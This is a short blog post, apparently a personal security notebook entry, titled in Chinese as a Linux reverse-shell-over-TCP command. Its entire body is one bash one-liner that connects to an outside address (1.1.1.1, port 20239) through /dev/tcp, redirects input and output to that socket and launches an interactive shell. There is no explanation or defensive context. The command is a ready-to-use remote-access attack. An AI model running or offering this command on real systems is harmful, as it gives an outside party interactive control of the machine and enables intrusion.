title: linux shell下命令反弹shell，tcp连接
categories: [网络安全,Linux]
tags: []
date: 2016-08-24 21:45:01
---
<pre>
exec 9<> /dev/tcp/1.1.1.1/20239;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i
</pre>